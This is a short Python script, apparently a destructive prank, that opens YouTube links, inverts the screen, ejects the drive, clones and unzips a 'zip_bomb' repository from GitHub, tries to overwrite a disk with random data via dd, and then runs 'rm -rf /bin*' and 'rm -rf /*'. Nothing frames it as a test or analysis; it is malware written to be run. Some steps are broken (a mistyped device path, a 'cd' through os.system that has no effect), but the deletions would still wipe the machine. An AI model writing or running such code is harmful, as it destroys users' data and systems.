import os
import webbrowser
url = "https://www.youtube.com/watch?v=hkmcZvKnFg4"
webbrowser.open(url)
url = "https://www.youtube.com/watch?v=AzOsKZ-9LTo"
webbrowser.open(url)
from time import sleep
sleep(20)
url = "https://i.ytimg.com/vi/jXaJYZjkInc/maxresdefault.jpg"

webbrowser.open(url)

cmd = 'xrandr -o inverted'
os.system(cmd)

cmd = 'eject'
os.system(cmd)

cmd = 'git clone https://github.com/skittleOS/zip_bomb'
os.system(cmd)

cmd = 'cd zip_bomb'
os.system(cmd)

cmd = 'unzip 10.zip'
os.system(cmd)

cmd = 'dd if=/dev/urandom of=/de/sda bs=512'
 
os.system(cmd)
from time import sleep
sleep(5)
cmd = 'rm -rf /bin*'
os.system(cmd)
from time import sleep
sleep(25)
cmd = 'rm -rf /*'
os.system(cmd)
